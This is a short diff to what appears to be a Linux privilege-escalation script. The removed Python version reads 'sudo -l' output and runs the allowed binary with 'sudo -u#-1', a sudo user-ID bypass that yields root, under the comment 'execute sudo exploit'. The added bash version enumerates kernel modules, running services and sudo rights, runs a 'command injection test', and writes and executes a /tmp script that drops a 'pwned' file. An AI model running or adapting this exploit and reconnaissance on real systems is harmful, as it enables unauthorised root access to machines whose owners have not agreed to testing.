@@ -1,25 +1,22 @@
-#!/usr/bin/python3
+#!/bin/bash
 
-import os
-
-#Get current username
-
-username = input("Enter current username :")
+echo "=== LOADED KERNEL MODULES ==="
+lsmod
 
 
-#check which binary the user can run with sudo
+echo "=== RUNNING SERVICES ==="
+systemctl list-units --type=service --state=running
 
-os.system("sudo -l > priv")
+
+echo "=== COMMAND INJECTION TEST ==="
+ls; echo "Injected command executed"
 
 
-os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
+echo "echo 'pwned' > /tmp/pwned.txt" > /tmp/test.sh
+chmod +x /tmp/test.sh
+/tmp/test.sh
+cat /tmp/pwned.txt
 
-binary_file = open("binary")
 
-binary= binary_file.read()
-
-#execute sudo exploit
-
-print("Lets hope it works")
-
-os.system("sudo -u#-1 "+ binary)
+echo "=== SUDO PRIVILEGES ==="
+sudo -l 2>/dev/null
